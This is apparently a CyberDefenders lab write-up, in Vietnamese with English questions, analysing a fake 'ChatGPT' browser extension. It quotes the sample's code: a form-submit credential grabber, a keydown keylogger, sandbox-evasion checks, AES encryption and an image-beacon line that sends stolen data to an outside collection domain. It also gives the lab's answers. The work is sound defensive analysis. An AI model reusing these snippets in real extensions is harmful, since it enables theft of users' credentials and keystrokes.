author: Azaki
published: published
created: 2025-12-30
tags: CyberDefener, Lab, Malware Analysis

Your cybersecurity team has been alerted to suspicious activity on your organization's network. Several employees reported unusual behavior in their browsers after installing what they believed to be a helpful browser extension named "ChatGPT". However, strange things started happening: accounts were being compromised, and sensitive information appeared to be leaking.

Your task is to perform a thorough analysis of this extension identify its malicious components.

<hr>
<p style="text-align:right; font-style:italic;">
  Author: <b>@Mo.Elshaheedy</b> 
</p>

## Q1: Which encoding method does the browser extension use to obscure target URLs, making them more difficult to detect during analysis?

**Yêu cầu:** Xác định phương thức encoding được extension sử dụng để che giấu URL mục tiêu.

Đầu tiên, tiến hành kiểm tra các file JavaScript của extension. Trong `app.js` có thể thấy một biến `targets` chứa chuỗi đáng chú ý:
```
const targets = [_0xabc1('d3d3LmZhY2Vib29rLmNvbQ==')];
```

![Pasted image 20260816105125.png](./images/Pasted%20image%2020260816105125.png)
Chuỗi kết thúc bằng dấu `==` là một dấu hiệu thường gặp của dữ liệu được encode bằng **Base64** do cơ chế padding của định dạng này.

>Base64

## Q2: Which website does the extension monitor for data theft, targeting user accounts to steal sensitive information?

**Yêu cầu:** Xác định website mà malicious extension theo dõi để đánh cắp thông tin người dùng.

Từ câu trước, ta đã tìm được một target được lưu dưới dạng Base64:
```
d3d3LmZhY2Vib29rLmNvbQ==
```

Tiến hành decode chuỗi này:
![Pasted image 20260816105129.png](./images/Pasted%20image%2020260816105129.png)

Kết quả:
```
www.facebook.com
```

Kết hợp với đoạn code trong `app.js`:
```js
const targets = [_0xabc1('d3d3LmZhY2Vib29rLmNvbQ==')];

if (targets.indexOf(window.location.hostname) !== -1) {
    ...
}
```

Có thể thấy extension kiểm tra hostname hiện tại của trình duyệt và chỉ kích hoạt một số chức năng đánh cắp dữ liệu khi người dùng truy cập website nằm trong danh sách `targets`.

>www.facebook.com

## Q3: Which type of HTML element is utilized by the extension to send stolen data?

**Yêu cầu:** Xác định HTML element được malicious extension sử dụng để gửi dữ liệu đã đánh cắp về attacker.

Tiếp tục phân tích `app.js`, chú ý tới function có tên:
```js
sendToServer(encryptedData)
```

Bên trong function có đoạn code:
```js
var img = new Image();

img.src =
    'https://Mo.Elshaheedy.com/collect?data=' +
    encodeURIComponent(encryptedData);

document.body.appendChild(img);
```

![Pasted image 20260816105134.png](./images/Pasted%20image%2020260816105134.png)

`new Image()` tạo một HTML image element, tương đương với:
```js
<img>
```

Extension sau đó gán URL của attacker vào thuộc tính `src` và đưa dữ liệu đã mã hóa vào parameter:
```js
?data=
```

Khi browser xử lý image resource này, một request được gửi đến server của attacker. Nhờ đó malware có thể lợi dụng một HTML element thông thường để thực hiện exfiltration.

>`<img>`

## Q4: What is the first specific condition in the code that triggers the extension to deactivate itself?

**Yêu cầu:** Xác định điều kiện đầu tiên khiến extension tự vô hiệu hóa.

Đối với câu này, chuyển sang phân tích file `loader.js`, vì đây là nơi chứa logic kiểm tra môi trường trước khi extension tiếp tục hoạt động.

Có thể thấy đoạn điều kiện:
```js
if (
    navigator.plugins.length === 0 ||
    /HeadlessChrome/.test(navigator.userAgent)
) {
    alert(
        "Virtual environment detected. Extension will disable itself."
    );

    chrome.runtime.onMessage.addListener(() => {
        return false;
    });
}
```

![Pasted image 20260816105137.png](./images/Pasted%20image%2020260816105137.png)

Extension thực hiện ít nhất hai phép kiểm tra:
```js
navigator.plugins.length === 0
```

và:
```js
/HeadlessChrome/.test(navigator.userAgent)
```

Đây là dấu hiệu của kỹ thuật **anti-analysis / sandbox detection**. Malware cố gắng nhận biết các môi trường trình duyệt bất thường hoặc headless environment thường được analyst sử dụng để phân tích mẫu.

>navigator.plugins.length === 0

## Q5: Which event does the extension capture to track user input submitted through forms?

**Yêu cầu:** Xác định event được extension theo dõi để lấy dữ liệu người dùng gửi thông qua form.

Quay lại `app.js`, trong phần xử lý website mục tiêu có thể thấy extension đăng ký một event listener:
```js
document.addEventListener('submit', function(event) {
    let form = event.target;
    let formData = new FormData(form);

    let username =
        formData.get('username') ||
        formData.get('email');

    let password =
        formData.get('password');
});
```

![Pasted image 20260816105141.png](./images/Pasted%20image%2020260816105141.png)

Event:
```js
submit
```
được kích hoạt khi người dùng submit một form.

Sau khi event xảy ra, extension tạo `FormData` từ form vừa được gửi và tìm các field:
```js
username
email
password
```

Điều này cho phép malicious extension lấy trực tiếp thông tin đăng nhập khi nạn nhân submit login form.

>submit

## Q6: Which API or method does the extension use to capture and monitor user keystrokes?

**Yêu cầu:** Xác định cơ chế extension sử dụng để theo dõi các phím được người dùng nhấn.

Tiếp tục phân tích `app.js`, có thể tìm thấy một event listener khác:
```js
document.addEventListener('keydown', function(event) {
    var key = event.key;
    exfiltrateData('keystroke', key);
});
```

![Pasted image 20260816105144.png](./images/Pasted%20image%2020260816105144.png)

Ở đây extension đăng ký listener thông qua:
```js
document.addEventListener(...)
```

và theo dõi event:
```js
keydown
```

Mỗi khi người dùng nhấn một phím, giá trị của phím đó được lấy thông qua:
```js
event.key
```

sau đó được chuyển tới:
```js
exfiltrateData('keystroke', key);
```

Như vậy extension hoạt động tương tự một **keylogger**, có khả năng ghi lại input bàn phím của người dùng.

>keydown

## Q7: What is the domain where the extension transmits the exfiltrated data?

**Yêu cầu:** Xác định domain được extension sử dụng để nhận dữ liệu đánh cắp.

Quay lại function:
```js
sendToServer(encryptedData)
```

có thể thấy URL được hardcode trực tiếp:
```js
img.src =
    'https://Mo.Elshaheedy.com/collect?data=' +
    encodeURIComponent(encryptedData);
```

![Pasted image 20260816105148.png](./images/Pasted%20image%2020260816105148.png)

Dữ liệu được đưa vào query parameter:
```js
/collect?data=<encrypted_data>
```
và browser sẽ tạo request tới server của attacker thông qua image resource

>Mo.Elshaheedy.com

## Q8: Which function in the code is used to exfiltrate user credentials, including the username and password?

**Yêu cầu:** Xác định function được sử dụng để exfiltrate username và password của nạn nhân.

Trong đoạn code xử lý event `submit`, extension lấy username và password từ form:
```js
let username =
    formData.get('username') ||
    formData.get('email');

let password =
    formData.get('password');
```

Sau đó kiểm tra:
```js
if (username && password) {
    exfiltrateCredentials(username, password);
}
```

![Pasted image 20260816105151.png](./images/Pasted%20image%2020260816105151.png)

Điều kiện:
```js
username && password
```
đảm bảo rằng cả hai thông tin đã được lấy thành công trước khi function exfiltration được gọi

>exfiltrateCredentials(username, password);

## Q9: Which encryption algorithm is applied to secure the data before sending?

**Yêu cầu:** Xác định thuật toán encryption được extension sử dụng trước khi gửi dữ liệu về attacker.

Để tìm thuật toán mã hóa, chuyển sang phân tích file `crypto.js`.

Trong file này có object:
```js
window.CryptoUtils
```

và function:
```js
encrypt: function(data)
```

Bên trong có đoạn:
```js
const key =
    CryptoJS.enc.Utf8.parse('SuperSecretKey123');

const iv =
    CryptoJS.lib.WordArray.random(16);

const encrypted =
    CryptoJS.AES.encrypt(data, key, { iv: iv });
```

![Pasted image 20260816105155.png](./images/Pasted%20image%2020260816105155.png)

Dòng quan trọng nhất là:
```js
CryptoJS.AES.encrypt(...)
```
cho thấy extension sử dụng **AES – Advanced Encryption Standard** để mã hóa dữ liệu trước khi exfiltration.

Ngoài ra, code còn tạo một IV ngẫu nhiên:
```js
CryptoJS.lib.WordArray.random(16)
```

và cuối cùng chuyển ciphertext sang Base64:
```js
encrypted.toString(CryptoJS.enc.Base64)
```

>AES

## Q10: What does the extension access to store or manipulate session-related data and authentication information?

**Yêu cầu:** Xác định loại dữ liệu trình duyệt mà extension được cấp quyền truy cập để thao tác với session và thông tin authentication.

Cuối cùng, tiến hành kiểm tra file:
```js
manifest.json
```

Đây là file khai báo metadata và các permission mà Chrome extension yêu cầu.

Trong phần `permissions` có thể thấy:
```js
"permissions": [
    "tabs",
    "http://*/*",
    "https://*/*",
    "storage",
    "webRequest",
    "webRequestBlocking",
    "cookies"
]
```

![Pasted image 20260816105200.png](./images/Pasted%20image%2020260816105200.png)

Trong đó permission đáng chú ý là:
```js
cookies
```

Cookie thường chứa các dữ liệu liên quan đến trạng thái đăng nhập và session của website. Việc malicious extension có quyền truy cập cookie làm tăng khả năng attacker thu thập hoặc lợi dụng thông tin authentication của người dùng

>cookies

---

# ATTACK CHAIN

![FakeGPT Lab.png](./images/FakeGPT%20Lab.png)